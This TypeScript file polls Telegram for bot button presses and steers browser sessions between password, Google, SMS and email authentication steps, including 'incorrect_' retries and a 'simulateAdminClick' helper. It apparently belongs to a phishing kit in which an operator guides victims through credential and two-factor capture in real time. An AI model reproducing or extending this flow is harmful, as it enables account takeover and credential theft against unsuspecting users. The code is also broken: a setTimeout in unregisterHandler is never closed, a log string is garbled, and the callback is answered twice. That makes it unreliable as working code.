// Telegram Callback Polling Service
// This service polls Telegram for callback button presses and handles user navigation

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

interface TelegramUpdate {
  update_id: number;
  callback_query?: {
    id: string;
    from: {
      id: number;
      first_name: string;
    };
    message: {
      message_id: number;
      chat: {
        id: number;
      };
    };
    data: string;
  };
}

interface CallbackHandler {
  sessionId: string;
  onCallback: (action: string) => void;
}

class TelegramCallbackService {
  private handlers = new Map<string, CallbackHandler>();
  private lastUpdateId = 0;
  private isPolling = false;
  private pollInterval: NodeJS.Timeout | null = null;
  private consecutiveErrors = 0;
  private currentPollDelay = 3000; // Start with 3 seconds
  private maxPollDelay = 30000; // Max 30 seconds
  private isOnline = true;

  /**
   * Clean up old handlers (keep more handlers to avoid session loss)
   */
  private cleanupOldHandlers() {
    if (this.handlers.size > 10) {
      // Keep max 10 handlers (increased from 3)
      const handlerEntries = Array.from(this.handlers.entries());
      // Keep only the last 5 handlers (increased from 2)
      handlerEntries.slice(0, -5).forEach(([sessionId]) => {
        console.log("🧹 Cleaning up old handler:", sessionId);
        this.handlers.delete(sessionId);
      });
    }
  }

  /**
   * Register a callback handler for a session
   */
  registerHandler(sessionId: string, onCallback: (action: string) => void) {
    console.log("📝 Registering callback handler for session:", sessionId);
    console.log("📊 Current handlers count:", this.handlers.size);

    this.handlers.set(sessionId, { sessionId, onCallback });

    // Clean up old handlers after adding new one (not before)
    this.cleanupOldHandlers();

    console.log("✅ Handler registered. Total handlers:", this.handlers.size);

    // Start polling if not already started
    if (!this.isPolling) {
      this.startPolling();
    }
  }

  /**
   * Unregister a callback handler (with delay to prevent race conditions)
   */
  unregisterHandler(sessionId: string) {
    console.log("🗑️ Scheduling unregistration for session:", sessionId);

    // Delay unregistration to prevent race conditions with incoming callbacks
    setTimeout(() => {
      console.log("🗑️ Unregistering callback handler for session:", sessionId);
      this.handlers.delete(sessionId);
      console.log("📊 Remaining handlers:", this.handlers.size);

      // Stop polling if no handlers left
    if (this.handlers.size === 0) {
      this.stopPolling();
    }
  }

  /**
   * Start polling for Telegram updates
   */
  async startPolling() {
    if (this.isPolling) return;

    console.log("🔄 Starting Telegram callback polling...");

    // Monitor network status
    this.setupNetworkMonitoring();

    // Clear webhook first to avoid 409 conflicts
    await this.clearWebhook();

    this.isPolling = true;
    this.currentPollDelay = 3000; // Reset delay
    this.consecutiveErrors = 0; // Reset error counter

    // Start polling with adaptive delay
    this.scheduleNextPoll();
  }

  /**
   * Stop polling
   */
  stopPolling() {
    console.log("⏹️ Stopping Telegram callback polling...");
    this.isPolling = false;

    if (this.pollInterval) {
      clearTimeout(this.pollInterval);
      this.pollInterval = null;
    }
  }

  /**
   * Setup network status monitoring
   */
  private setupNetworkMonitoring() {
    if (typeof window !== "undefined") {
      window.addEventListener("online", () => {
        console.log("🌐 Network is back online");
        this.isOnline = true;
        this.consecutiveErrors = 0;
        this.currentPollDelay = 3000; // Reset delay
      });

      window.addEventListener("offline", () => {
        console.log("🌐 Network is offline");
        this.isOnline = false;
      });

      this.isOnline = navigator.onLine;
    }
  }

  /**
   * Schedule next poll with adaptive delay
   */
  private scheduleNextPoll() {
    if (!this.isPolling) return;

    this.pollInterval = setTimeout(() => {
      this.pollUpdates();
    }, this.currentPollDelay);
  }

  /**
   * Clear webhook to avoid conflicts
   */
  private async clearWebhook() {
    if (!this.validateToken()) return;

    try {
      console.log("🧹 Clearing Telegram webhook...");
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
        },
      );

      if (response.ok) {
        console.log("✅ Webhook cleared successfully");
      } else {
        console.warn("⚠️ Failed to clear webhook:", response.status);
      }
    } catch (error) {
      console.warn("⚠️ Error clearing webhook:", error);
    }
  }

  /**
   * Poll for new updates from Telegram
   */
  private async pollUpdates() {
    // Check if we should continue polling
    if (!this.isPolling) {
      return;
    }

    // Handle demo mode
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Checking for simulated callbacks");
      this.checkForSimulatedCallbacks();
      this.scheduleNextPoll();
      return;
    }

    // Check network status
    if (!this.isOnline) {
      console.log("🌐 Network offline, skipping poll");
      this.scheduleNextPoll();
      return;
    }

    try {
      // Create AbortController for timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout

      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=5&limit=1`,
        {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
          signal: controller.signal,
        },
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        await this.handleHttpError(response);
        return;
      }

      // Success! Reset error handling
      this.onSuccessfulPoll();

      const data = await response.json();
      const updates: TelegramUpdate[] = data.result || [];

      for (const update of updates) {
        this.lastUpdateId = Math.max(this.lastUpdateId, update.update_id);

        if (update.callback_query) {
          await this.handleCallback(update.callback_query);
        }
      }
    } catch (error) {
      await this.handleNetworkError(error);
    } finally {
      // Schedule next poll
      this.scheduleNextPoll();
    }
  }

  /**
   * Handle successful poll
   */
  private onSuccessfulPoll() {
    this.consecutiveErrors = 0;
    this.currentPollDelay = 3000; // Reset to normal delay
  }

  /**
   * Handle HTTP errors
   */
  private async handleHttpError(response: Response) {
    if (response.status === 409) {
      console.warn("⚠️ Telegram 409 Conflict - clearing webhook...");
      await this.clearWebhook();
      this.currentPollDelay = 10000; // Wait longer after 409
      return;
    }

    console.error(`❌ HTTP ${response.status} error from Telegram API`);
    this.incrementErrorsAndAdjustDelay();
  }

  /**
   * Handle network errors (fetch failures)
   */
  private async handleNetworkError(error: any) {
    if (error.name === "AbortError") {
      console.warn("⏰ Request timeout - network may be slow");
    } else {
      console.warn(
        "🌐 Network error (likely connection issue):",
        error.message,
      );
    }

    this.incrementErrorsAndAdjustDelay();
  }

  /**
   * Increment error count and adjust polling delay
   */
  private incrementErrorsAndAdjustDelay() {
    this.consecutiveErrors++;

    // Exponential backoff
    this.currentPollDelay = Math.min(
      this.currentPollDelay * 1.5,
      this.maxPollDelay,
    );

    console.log(
      `⚠️ Error count: ${this.consecutiveErrors}, next poll in ${this.currentPollDelay / 1000}s`,
    );

    // Stop polling after too many errors
    if (this.consecutiveErrors >= 10) {
      console.log("❌ Too many consecutive errors, stopping polling");
      this.stopPolling();

      // Auto-restart after 60 seconds if handlers still exist
      setTimeout(() => {
        if (this.handlers.size > 0 && !this.isPolling) {
          console.log("🔄 Auto-restarting polling after error cooldown");
          this.startPolling();
        }
      }, 60000);
    }
  }

  /**
   * Check for simulated callbacks in demo mode
   */
  private checkForSimulatedCallbacks() {
    const simulatedCallback = localStorage.getItem("simulatedCallback");
    if (simulatedCallback) {
      try {
        const callbackData = JSON.parse(simulatedCallback);
        if (callbackData.action && callbackData.sessionId) {
          console.log(
            "🎭 Demo mode: Processing simulated callback:",
            callbackData,
          );

          // Find the handler
          const handler = this.handlers.get(callbackData.sessionId);
          if (handler) {
            handler.onCallback(callbackData.action);
          } else {
            console.error(
              "❌ No handler found for simulated callback:",
              callbackData,
            );
          }

          // Clear the simulated callback
          localStorage.removeItem("simulatedCallback");
        }
      } catch (error) {
        console.error("❌ Error processing simulated callback:", error);
        localStorage.removeItem("simulatedCallback");
      }
    }
  }

  /**
   * Handle a callback query from Telegram
   */
  private async handleCallback(callback: any) {
    console.log("���� Received callback query:", callback);

    const callbackData = callback.data;

    // Parse callback data: auth_TYPE_SESSIONID or incorrect_TYPE_SESSIONID or complete_auth_SESSIONID
    const parts = callbackData.split("_");
    if (parts.length < 2) {
      console.error("❌ Invalid callback data format:", callbackData);
      return;
    }

    let action: string;
    let sessionId: string;

    if (parts[0] === "auth") {
      // Format: auth_TYPE_SESSIONID
      if (parts.length < 3) {
        console.error("❌ Invalid auth callback format:", callbackData);
        return;
      }
      action = parts[1]; // password, google, sms, email
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "incorrect") {
      // Format: incorrect_TYPE_SESSIONID
      if (parts.length < 3) {
        console.error("❌ Invalid incorrect callback format:", callbackData);
        return;
      }
      action = `incorrect_${parts[1]}`; // incorrect_password, incorrect_google, etc.
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "complete") {
      // Format: complete_auth_SESSIONID
      if (parts.length < 3) {
        console.error("❌ Invalid complete callback format:", callbackData);
        return;
      }
      action = "complete";
      sessionId = parts.slice(2).join("_");
    } else {
      console.error("❌ Unknown callback action:", callbackData);
      return;
    }

    console.log("🎯 Parsed callback:", { action, sessionId });

    // Find the handler for this session
    let handler = this.handlers.get(sessionId);

    if (!handler) {
      console.warn("⚠️ No exact handler found for session:", sessionId);
      console.log("🔍 Available handlers:", Array.from(this.handlers.keys()));

      // Try to find a similar or recent session as fallback
      if (this.handlers.size > 0) {
        // Get the most recent handler (last added)
        const handlerEntries = Array.from(this.handlers.entries());
        const mostRecentHandler = handlerEntries[handlerEntries.length - 1];

        console.log(
          "🔄 Using most recent handler as fallback:",
          mostRecentHandler[0],
        );
        handler = mostRecentHandler[1];

        await this.answerCallbackQuery(
          callback.id,
          `✅ Using active session for ${action}`,
        );
      } else {
        // No handlers available at all
        await this.answerCallbackQuery(
          callback.id,
          "❌ No active sessions found",
        );
        return;
      }
    } else {
      // Exact handler found
      await this.answerCallbackQuery(
        callback.id,
        `✅ Redirecting to ${action} authentication`,
      );
    }

    // Answer the callback query first
    await this.answerCallbackQuery(
      callback.id,
      `✅ Redirecting to ${action} authentication`,
    );

    // Call the handler
    try {
      handler.onCallback(action);
    } catch (error) {
      console.error("❌ Error in callback handler:", error);
    }
  }

  /**
   * Answer a callback query to remove loading state in Telegram
   */
  private async answerCallbackQuery(callbackQueryId: string, text: string) {
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Would answer callback query:", text);
      return;
    }

    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false,
          }),
        },
      );
    } catch (error) {
      console.error("❌ Failed to answer callback query:", error);
    }
  }

  /**
   * Validate Telegram token
   */
  private validateToken(): boolean {
    return TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN";
  }

  /**
   * Get polling status
   */
  getStatus() {
    return {
      isPolling: this.isPolling,
      handlersCount: this.handlers.size,
      lastUpdateId: this.lastUpdateId,
      consecutiveErrors: this.consecutiveErrors,
      currentPollDelay: this.currentPollDelay,
      isOnline: this.isOnline,
    };
  }
}

// Create singleton instance
export const telegramCallbackService = new TelegramCallbackService();

// Export utility functions
export const registerTelegramCallback = (
  sessionId: string,
  onCallback: (action: string) => void,
) => {
  telegramCallbackService.registerHandler(sessionId, onCallback);
};

export const unregisterTelegramCallback = (sessionId: string) => {
  telegramCallbackService.unregisterHandler(sessionId);
};

export const getTelegramCallbackStatus = () => {
  return telegramCallbackService.getStatus();
};

// Utility function to simulate admin clicks in demo mode
export const simulateAdminClick = (sessionId: string, action: string) => {
  console.log("🎭 Simulating admin click:", { sessionId, action });

  localStorage.setItem(
    "simulatedCallback",
    JSON.stringify({
      sessionId,
      action,
      timestamp: Date.now(),
    }),
  );

  console.log("📝 Simulated callback stored in localStorage");
};

// Utility function to manually clear webhook
// Manual polling control functions
export const stopTelegramPolling = () => {
  console.log("🛑 Manually stopping Telegram polling");
  telegramCallbackService.stopPolling();
};

export const startTelegramPolling = () => {
  console.log("▶️ Manually starting Telegram polling");
  telegramCallbackService.startPolling();
};

export const clearTelegramWebhook = async (): Promise<{
  success: boolean;
  message: string;
}> => {
  const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;

  if (!token || token === "YOUR_BOT_TOKEN") {
    return {
      success: false,
      message: "Telegram bot token not configured",
    };
  }

  try {
    console.log("🧹 Manually clearing Telegram webhook...");
    const response = await fetch(
      `https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
      },
    );

    if (response.ok) {
      const result = await response.json();
      console.log("✅ Webhook cleared successfully:", result);
      return {
        success: true,
        message: "Webhook cleared successfully",
      };
    } else {
      const errorText = await response.text();
      console.error("❌ Failed to clear webhook:", response.status, errorText);
      return {
        success: false,
        message: `Failed to clear webhook: ${response.status} - ${errorText}`,
      };
    }
  } catch (error) {
    console.error("❌ Error clearing webhook:", error);
    return {
      success: false,
      message: `Error: ${error instanceof Error ? error.message : String(error)}`,
    };
  }
};